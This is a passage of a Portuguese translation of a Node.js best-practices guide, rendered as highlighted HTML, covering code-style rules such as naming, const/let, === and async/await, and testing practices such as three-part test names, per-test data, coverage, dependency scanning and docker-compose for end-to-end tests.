    <span class="token comment">// ...</span>
<span class="token punctuation">}</span>

<span class="token function">doThing</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">// Faça</span>

<span class="token keyword">const</span> items <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>
items<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>log<span class="token punctuation">)</span>

<span class="token comment">// Evitar - lança exceção</span>
<span class="token keyword">const</span> m <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token operator">...</span>m<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>log<span class="token punctuation">)</span>
<span class="token operator">></span> <span class="token punctuation">[</span><span class="token operator">...</span>m<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>log<span class="token punctuation">)</span>
<span class="token operator">></span>  <span class="token operator">^</span><span class="token operator">^</span><span class="token operator">^</span>
<span class="token operator">></span> SyntaxError<span class="token operator">:</span> Unexpected token <span class="token operator">...</span>

<span class="token comment">// Evitar - lança exceção</span>
<span class="token keyword">const</span> count <span class="token operator">=</span> <span class="token number">2</span> <span class="token comment">// tenta executar 2(), mas 2 não é uma função</span>
<span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// Faça algo incrível</span>
<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">// Coloque um ponto-e-vírgula antes da função invocada imediatamente, após a definição const, salve o valor de retorno da função anônima para uma variável ou evite IIFEs no conjunto</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>🔗 <a href="https://eslint.org/docs/rules/semi" target="_blank" rel="nofollow noopener noreferrer"><strong>Leia mais:</strong> “Regra Semi ESLint”</a>
🔗 <a href="https://eslint.org/docs/rules/no-unexpected-multiline" target="_blank" rel="nofollow noopener noreferrer"><strong>Leia mais:</strong> “Nenhuma regra ESLint de múltiplas linhas inesperada”</a></p>
<h2>3.5 Nomeie Suas Funções</h2>
<p><strong>TL;DR:</strong> Nomeie todas as funções, incluindo closures e callbacks. Evite funções anônimas. Isso é especialmente útil em uma aplicação node. Nomear todas a funções permitirá que você entenda facilmente o que está olhando quando verificar um snapshot da memória.</p>
<p><strong>Caso contrário:</strong> A depuração de problemas de produção usando um dump principal (snapshot da memória) pode se tornar um desafio quando você percebe um consumo significativo de memória de funções anônimas.</p>
<h2>3.6 Convenções de nomenclatura para variáveis, constantes, funções e classes</h2>
<p><strong>TL;DR:</strong> Utilize <strong><em>lowerCamelCase</em></strong> quando nomeando constantes, variáveis e funções, e <strong><em>UpperCamelCase</em></strong> (primeira letra maiúscula também) quando nomeando classes. Isso irá lhe ajudar a distinguir facilmente entre variáveis/funções, e classes que necessitam de instanciação. Use nomes descritivos, mas tente mantê-los curtos.</p>
<p><strong>Caso contrário:</strong> O JavaScript é a única linguagem no mundo que permite invocar um construtor (“Class”) diretamente sem instanciá-lo primeiro. Consequentemente, Classes e construtores de funções são diferenciados começando com UpperCamelCase</p>
<h3>Exemplo de Código</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// para classes nós usamos UpperCamelCase</span>
<span class="token keyword">class</span> <span class="token class-name">SomeClassExample</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

<span class="token comment">// para nomes de constantes nós usamos a palavra const e lowerCamelCase</span>
<span class="token keyword">const</span> config <span class="token operator">=</span> <span class="token punctuation">{</span>
  key<span class="token operator">:</span> <span class="token string">'value'</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// para nomes de variáveis e funções nós usamos lowerCamelCase</span>
<span class="token keyword">let</span> someVariableExample <span class="token operator">=</span> <span class="token string">'value'</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>3.7 Prefira const do que let. Esqueça do var</h2>
<p><strong>TL;DR:</strong> Usar <code class="language-text">const</code> significa que uma vez que a variável foi atribuída, ela não pode ser reatribuída. Preferir const irá te ajudar a não cair na tentação de utilizar a mesma variável para diferentes usos, e irá deixar seu código mais limpo. Se uma variável precisa ser reatribuída, em um for loop, por exemplo, use <code class="language-text">let</code> para declarar. Outro aspecto importante do <code class="language-text">let</code> é que esta variável só estará disponível no escopo de código em que ela foi definida. <code class="language-text">var</code> tem escopo de função, não de bloco, e <a href="https://hackernoon.com/why-you-shouldnt-use-var-anymore-f109a58b9b70" target="_blank" rel="nofollow noopener noreferrer">não deveria ser utilizada em ES6</a>
, agora que você tem const e let ao seu dispor.</p>
<p><strong>Caso contrário:</strong> A depuração se torna muito mais complicada ao seguir uma variável que frequentemente muda</p>
<p>🔗 <a href="https://medium.com/javascript-scene/javascript-es6-var-let-or-const-ba58b8dcde75" target="_blank" rel="nofollow noopener noreferrer"><strong>Leia Mais: JavaScript ES6+: var, let ou const?</strong> </a></p>
<h2>3.8 Requires vem primeiro e não dentro de funções</h2>
<p><strong>TL;DR:</strong> Faça o require de módulos no início de cada arquivo, antes e fora de qualquer função. Esta simples prática irá te ajudar não apenas a reconhecer as dependências de um determinado arquivo com facilidade e rapidez, como também evitará alguns possíveis problemas.</p>
<p><strong>Caso contrário:</strong> Os requires rodam de forma síncrona pelo Node.js. Se eles forem chamados de dentro de uma função, isso pode impedir que outras solicitações sejam tratadas em um momento mais crítico. Além disso, se um módulo necessário ou qualquer uma de suas dependências lançar um erro e travar o servidor, é melhor descobrir isso o mais rápido possível, o que pode não ser o caso se este módulo tiver sido declarado dentro de uma função.</p>
<h2>3.9 Faça Require nas pastas, não diretamente nos arquivos</h2>
<p><strong>TL;DR:</strong> Ao desenvolver um módulo/biblioteca em uma pasta, coloque um arquivo index.js que exponha os componentes internos do módulo para que cada consumidor passe por ele. Isso serve como uma ‘interface’ para seu módulo e facilita futuras mudanças sem causar perdas.</p>
<p><strong>Caso contrário:</strong> Alterar a estrutura interna dos arquivos ou a assinatura pode quebrar a interface com clientes.</p>
<h3>Exemplo de Código</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// Do</span>
module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>SMSProvider <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./SMSProvider'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>SMSNumberResolver <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./SMSNumberResolver'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Avoid</span>
module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>SMSProvider <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./SMSProvider/SMSProvider.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>SMSNumberResolver <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./SMSNumberResolver/SMSNumberResolver.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>3.10 Use 0 operador <code class="language-text">===</code></h2>
<p><strong>TL;DR:</strong> Dê preferência em usar o operador de comparação estrita <code class="language-text">===</code> ao invés do operador de comparação abstrata <code class="language-text">==</code>, que é mais fraco. <code class="language-text">==</code> irá comparar duas variáveis depois de convertê-las para o mesmo tipo. Não há conversão de tipo no <code class="language-text">===</code> e ambas as variáveis devem ser do mesmo tipo para serem iguais.</p>
<p><strong>Caso contrário:</strong> Variáveis diferentes podem retornar verdadeiro quando comparadas usando o operador <code class="language-text">==</code>.</p>
<h3>Exemplo de Código</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token string">''</span> <span class="token operator">==</span> <span class="token string">'0'</span>           <span class="token comment">// false</span>
<span class="token number">0</span> <span class="token operator">==</span> <span class="token string">''</span>             <span class="token comment">// true</span>
<span class="token number">0</span> <span class="token operator">==</span> <span class="token string">'0'</span>            <span class="token comment">// true</span>

<span class="token boolean">false</span> <span class="token operator">==</span> <span class="token string">'false'</span>    <span class="token comment">// false</span>
<span class="token boolean">false</span> <span class="token operator">==</span> <span class="token string">'0'</span>        <span class="token comment">// true</span>

<span class="token boolean">false</span> <span class="token operator">==</span> <span class="token keyword">undefined</span>  <span class="token comment">// false</span>
<span class="token boolean">false</span> <span class="token operator">==</span> <span class="token keyword">null</span>       <span class="token comment">// false</span>
<span class="token keyword">null</span> <span class="token operator">==</span> <span class="token keyword">undefined</span>   <span class="token comment">// true</span>

<span class="token string">' \t\r\n '</span> <span class="token operator">==</span> <span class="token number">0</span>     <span class="token comment">// true</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Todas as declarações acima false se feitas com <code class="language-text">===</code>.</p>
<h2>3.11 Use Async Await, evite callbacks</h2>
<p><strong>TL;DR:</strong> Agora o Node 8 LTS possui suporte completo para Async-await. Esta é uma nova maneira de lidar com códigos assíncronos que substitui callbacks e promises. Async-await é não-bloqueante, e isso faz com que os códigos assíncronos pareçam síncronos. O melhor presente que você pode dar ao seu código é usar async-await, que fornece uma sintaxe de código muito mais compacta e familiar como o try-catch.</p>
<p><strong>Caso contrário:</strong> Lidar com erros assíncronos no estilo de callback é provavelmente o caminho mais rápido para o inferno - esse estilo força verificar todos os erros, lidar com desajeitados aninhamentos de código e torna difícil raciocinar sobre o fluxo de código.</p>
<p>🔗<a href="https://github.com/yortus/asyncawait" target="_blank" rel="nofollow noopener noreferrer"><strong>Leia mais:</strong> Guia do async await 1.0</a></p>
<h2>3.12 Use Fat (=>) Arrow Functions</h2>
<p><strong>TL;DR:</strong> Embora seja recomendado usar async-await e evitar parâmetros de função ao lidar com APIs antigas, que aceitam promises ou callbacks - arrow functions tornam a estrutura do código mais compacta e mantém o contexto léxico da função raiz (por exemplo, ‘this’).</p>
<p><strong>Caso contrário:</strong> Códigos mais longos (em funções ES5) são mais propensos a erros e são mais difíceis de ler.</p>
<p>🔗 <a href="https://medium.com/javascript-scene/familiarity-bias-is-holding-you-back-its-time-to-embrace-arrow-functions-3d37e1a9bb75" target="_blank" rel="nofollow noopener noreferrer"><strong>Leia mais: Arrow Functions - é hora de abraçar a causa</strong></a></p>
<h1><code class="language-text">4. Práticas de Testes e Qualidade Geral</code></h1>
<h2>4.1 No mínimo, escreva testes de API (componente)</h2>
<p><strong>TL;DR:</strong> A maioria dos projetos simplesmente não possuem testes automatizados devido a falta de tempo ou geralmente o ‘testing project’ fica fora de controle e acaba sendo abandonado. Por esse motivo, priorize e comece com o teste de API, que é o mais fácil de escrever e proporciona mais cobertura do que os testes unitários (você pode inclusive criar testes de API sem código usando ferramentas como <a href="https://www.getpostman.com/" target="_blank" rel="nofollow noopener noreferrer">Postman</a>). Depois, se você tiver mais recursos e tempo, continue com testes avançados, como testes unitários, testes de banco de dados, testes de desempenho, etc.</p>
<p><strong>Caso contrário:</strong> Voce pode passar longos dias escrevendo testes unitários para perceber que possui apenas 20% de cobertura de sistema.</p>
<h2>4.2 Inclua 3 partes em cada nome de teste</h2>
<p><strong>TL;DR:</strong> Faça o teste falar no nível de requisitos, de modo que seja autoexplicativo para engenheiros de garantia de qualidade e desenvolvedores que não estão familiarizados com o código. Indicar no nome do teste o que está sendo testado (unidade em teste), em que circunstâncias e qual é o resultado esperado.</p>
<p><strong>Caso contrário:</strong> Uma implantação falhou, um teste chamado “Adicionar produto” falhou. Isso lhe diz exatamente o que está errado?</p>
<h1>Inclua 3 partes em cada nome de teste</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Um relatório de teste deve informar se a revisão atual do aplicativo satisfaz os requisitos para as pessoas que não estão necessariamente familiarizadas com o código: o testador, o engenheiro de DevOps que está implantando e o futuro daqui a dois anos. Isso pode ser melhor alcançado se os testes falarem no nível de requisitos e incluírem 3 partes:</p>
<p>(1) O que está sendo testado? Por exemplo, o método ProductsService.addNewProduct</p>
<p>(2) Em que circunstâncias e cenário? Por exemplo, nenhum preço é passado para o método</p>
<p>(3) Qual é o resultado esperado? Por exemplo, o novo produto não é aprovado</p>
<h3>Exemplo de código: um nome de teste que inclui 3 partes</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">//1. unidade em teste</span>
<span class="token function">describe</span><span class="token punctuation">(</span><span class="token string">'Serviço de Produtos'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">describe</span><span class="token punctuation">(</span><span class="token string">'Adicionar novo produto'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">//2. cenário e 3. expectativa</span>
    <span class="token function">it</span><span class="token punctuation">(</span><span class="token string">'Quando nenhum preço é especificado, o status do produto está aguardando aprovação'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> newProduct <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProductService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">expect</span><span class="token punctuation">(</span>newProduct<span class="token punctuation">.</span>status<span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">.</span><span class="token function">equal</span><span class="token punctuation">(</span><span class="token string">'pendingApproval'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Exemplo de código - Anti-padrão: é necessário ler todo o código de teste para entender a intenção</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token function">describe</span><span class="token punctuation">(</span><span class="token string">'Serviço de Produtos'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">describe</span><span class="token punctuation">(</span><span class="token string">'Adicionar novo produto'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">it</span><span class="token punctuation">(</span><span class="token string">'Deve devolver o status correto'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span> <span class="token punctuation">{</span>
        <span class="token comment">//hmm, o que é esta verificação de teste? Quais são o cenário e a expectativa?</span>
      <span class="token keyword">const</span> newProduct <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProductService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">expect</span><span class="token punctuation">(</span>newProduct<span class="token punctuation">.</span>status<span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">.</span><span class="token function">equal</span><span class="token punctuation">(</span><span class="token string">'pendingApproval'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>“Fazendo direito exemplo: O relatório de teste se assemelha ao documento de requisitos”</h3>
<p> <a href="https://medium.com/@me_37286/yoni-goldberg-javascript-nodejs-testing-best-practices-2b98924c9347" target="_blank" rel="nofollow noopener noreferrer">Do blog “30 Node.js testing best practices” por Yoni Goldberg</a></p>
<p> <img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/test-report-like-requirements.jpeg?raw=true" alt="Um exemplo de relatório de teste" title="Um exemplo de relatório de teste"></p>
<h2>4.3 Detecte problemas de código com um linter</h2>
<p><strong>TL;DR:</strong> Use um code linter para checar a qualidade básica e detectar antipadrões antecipadamente. Rode-o antes de qualquer teste e adicione-o como um pre-commit git-hook para minimizar o tempo necessário para revisar e corrigir qualquer problema. Veja também <a href="https://github.com/goldbergyoni/nodebestpractices#3-code-style-practices" target="_blank" rel="nofollow noopener noreferrer">Seção 3</a> no Prática de Estilo de Código.</p>
<p><strong>Caso contrário:</strong> Você pode deixar passar algum antipadrão e possível código vulnerável para seu ambiente de produção.</p>
<h2>4.4 Evite dados fixos e sementes para teste, adicione os dados no teste</h2>
<p><strong>TL;DR:</strong> Para evitar o acoplamento de testes e facilitar o entendimento do fluxo do teste, cada teste deve adicionar e atuar em seu próprio conjunto de linhas de banco de dados. Sempre que um teste precisar extrair ou assumir a existência de alguns dados do banco de dados - ele deve incluir explicitamente esses dados e evitar a mutação de outros registros</p>
<p><strong>Caso contrário:</strong> Considere um cenário em que a implementação é abortada devido a falhas nos testes. Agora, a equipe gastará um tempo precioso de investigação que termina em uma triste conclusão: o sistema funciona bem, mas os testes interferem uns nos outros e quebram a compilação</p>
<h1>Evite dados fixos e sementes para teste, adicione os dados no teste</h1>
<h3>Explicação em um Parágrafo</h3>
<p> Seguindo a regra de ouro de testes - manter os casos de teste totalmente simples, cada teste deve adicionar e agir em seu próprio conjunto de linhas de banco de dados para evitar o acoplamento e facilitar o entendimento do fluxo do teste. Na realidade, isso é frequentemente violado por testadores que semeiam o banco de dados com os dados antes de executar os testes (também conhecidos como ‘dispositivo de teste’) para melhorar o desempenho. Embora o desempenho seja de fato uma preocupação válida - ele pode ser mitigado (por exemplo, BD In-memory, consulte “Teste de Componente”), no entanto, a complexidade do teste é muito dolorosa e deve governar outras considerações. Na prática, faça com que cada caso de teste inclua explicitamente os registros de banco de dados necessários e atue apenas nesses registros. Se o desempenho se torna uma preocupação crítica - um compromisso equilibrado pode vir na forma de semear o único conjunto de testes que não estão alterando dados (por exemplo, consultas)</p>
<h3>Exemplo de código: cada teste atua em seu próprio conjunto de dados</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token function">it</span><span class="token punctuation">(</span><span class="token string">"Ao atualizar o nome do site, obtenha confirmação de sucesso"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token comment">//teste está adicionando novos registros e atuando apenas nos registros</span>
  <span class="token keyword">const</span> siteUnderTest <span class="token operator">=</span> <span class="token keyword">await</span> SiteService<span class="token punctuation">.</span><span class="token function">addSite</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">"siteForUpdateTest"</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> updateNameResult <span class="token operator">=</span> <span class="token keyword">await</span> SiteService<span class="token punctuation">.</span><span class="token function">changeName</span><span class="token punctuation">(</span>siteUnderTest<span class="token punctuation">,</span> <span class="token string">"newName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">expect</span><span class="token punctuation">(</span>updateNameResult<span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">.</span><span class="token function">be</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Exemplo de Código - Anti-Padrão: os testes não são independentes e assumem a existência de alguns dados pré-configurados</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token function">before</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token comment">//adicionando sites e dados de administradores ao nosso banco de dados. Onde estão os dados? lado de fora. Em algum json externo ou estrutura de migração</span>
  <span class="token keyword">await</span> <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">AddSeedDataFromJson</span><span class="token punctuation">(</span><span class="token string">'seed.json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">it</span><span class="token punctuation">(</span><span class="token string">"Ao atualizar o nome do site, obtenha confirmação de sucesso"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token comment">//Eu sei que o nome do site "portal" existe - eu vi nos arquivos de semente</span>
  <span class="token keyword">const</span> siteToUpdate <span class="token operator">=</span> <span class="token keyword">await</span> SiteService<span class="token punctuation">.</span><span class="token function">getSiteByName</span><span class="token punctuation">(</span><span class="token string">"Portal"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> updateNameResult <span class="token operator">=</span> <span class="token keyword">await</span> SiteService<span class="token punctuation">.</span><span class="token function">changeName</span><span class="token punctuation">(</span>siteToUpdate<span class="token punctuation">,</span> <span class="token string">"newName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">expect</span><span class="token punctuation">(</span>updateNameResult<span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">.</span><span class="token function">be</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">it</span><span class="token punctuation">(</span><span class="token string">"Ao consultar pelo nome do site, obtenha o site correto"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token comment">//Eu sei que o nome do site "portal" existe - eu vi nos arquivos de semente</span>
  <span class="token keyword">const</span> siteToCheck <span class="token operator">=</span> <span class="token keyword">await</span> SiteService<span class="token punctuation">.</span><span class="token function">getSiteByName</span><span class="token punctuation">(</span><span class="token string">"Portal"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">expect</span><span class="token punctuation">(</span>siteToCheck<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">.</span>be<span class="token punctuation">.</span><span class="token function">equal</span><span class="token punctuation">(</span><span class="token string">"Portal"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Falha! O teste anterior muda o nome :[</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>4.5 Inspencione constantemente por dependências vulneráveis</h2>
<p><strong>TL;DR:</strong> Até mesmo as dependências mais confiáveis, como o Express, têm vulnerabilidades conhecidas. Isso pode ser facilmente contornado usando ferramentas comunitárias e comerciais como 🔗 <a href="https://github.com/nodesecurity/nsp" target="_blank" rel="nofollow noopener noreferrer">nsp</a> que pode ser invocado a partir do seu CI em cada build.</p>
<p><strong>Caso contrário:</strong> Manter seu código livre de vulnerabilidades sem ferramentas dedicadas exigirá o acompanhamento constante de publicações online sobre novas ameaças. Saia do tédio.</p>
<h2>4.6 Marque seus testes</h2>
<p><strong>TL;DR:</strong> Diferentes testes devem rodar em diferentes cenários: testes de rápidos, sem IO, devem ser executados quando um desenvolvedor salva ou faz commit em um arquivo, testes completos de ponta a ponta geralmente são executados quando uma nova solicitação de request é enviada, etc. Isso pode ser conseguido através da marcação de testes com palavras-chave como #cold #api #sanity. Assim você pode invocar o subconjunto desejado. Por exemplo, é desta forma que você invocaria apenas o grupo de sanity test usando o <a href="https://mochajs.org/" target="_blank" rel="nofollow noopener noreferrer">Mocha</a>: mocha —grep ‘sanity’</p>
<p><strong>Caso contrário:</strong> Rodar todos os testes, incluindo aqueles que executam dezenas de consultas de banco de dados, sempre que o desenvolvedor fizer uma pequena alteração pode ser extremamente lento e impedir que desenvolvedores executem testes.</p>
<h2>4.7 Verifique a cobertura de seu teste, isso te ajuda a identificar padrões incorretos de teste</h2>
<p><strong>TL;DR:</strong> Ferramentas de cobertura de código como <a href="https://github.com/istanbuljs/istanbuljs" target="_blank" rel="nofollow noopener noreferrer">Istanbul</a>/<a href="https://github.com/istanbuljs/nyc" target="_blank" rel="nofollow noopener noreferrer">NYC</a>, são ótimas por 3 motivos: elas são gratuitas (nenhum esforço é necessário para beneficiar esses relatórios), elas ajuda a identificar diminuição na cobertura de testes, e por último mas não menos importante, ela destacam a incompatibilidade de testes: olhando relatórios coloridos de cobertura de código, você pode notar, por exemplo, áreas de código que nunca são testadas como cláusulas catch (o que significa que os testes só invocam os caminhos felizes e não como o aplicativo se comporta em erros). Configure-o para falhas se a cobertura estiver abaixo de um certo limite.</p>
<p><strong>Caso contrário:</strong> Não haverá nenhuma métrica automática informando quando uma grande parte de seu código não é coberta pelo teste.</p>
<h2>4.8 Inspecione pacotes desatualizados</h2>
<p><strong>TL;DR:</strong> Use sua ferramenta preferida (por exemplo, ‘npm outdated’ ou <a href="https://www.npmjs.com/package/npm-check-updates" target="_blank" rel="nofollow noopener noreferrer">npm-check-updates</a> para detectar pacotes instalados que estão desatualizados, injetar essa verificação em seu pipeline de CI e até mesmo fazer uma falha grave em um cenário grave. Por exemplo, um cenário grave pode ser quando um pacote instalado esteja há 5 commits atrás (por exemplo, a versão local é 1.3.1 e a versão no repositório é 1.3.8) ou está marcada como descontinuada pelo autor - mate o build e impeça a implantação desta versão.</p>
<p><strong>Caso contrário:</strong> Sua produção executará pacotes que foram explicitamente marcados pelo autor como arriscados.</p>
<h2>4.9 Use docker-compose para testes e2e</h2>
<p><strong>TL;DR:</strong> Teste de ponta a ponta (end to end, ou e2e), que inclui dados ativos, costumava ser o elo mais fraco do processo de CI, já que depende de vários serviços pesados como o banco de dados. O docker-compose deixa isso mamão com açúcar, criando um ambiente de produção usando um arquivo de texto simples e comandos fáceis. Isto permite criar todos os serviços dependentes, banco de dados e rede isolada para teste e2e. Por último mas não menos importante, ele pode manter um ambiente sem estado que é invocado antes de cada suíte de testes e é encerrado logo após.</p>
<p><strong>Caso contrário:</strong> Sem o docker-compose, as equipes devem manter um banco de dados de teste para cada ambiente de teste, incluindo as máquinas dos desenvolvedores, e manter todos esses bancos de dados sincronizados para que os resultados dos testes não variem entre os ambientes.</p>
<h2>4.10 Refatore regularmente usando ferramentas de análise estática</h2>
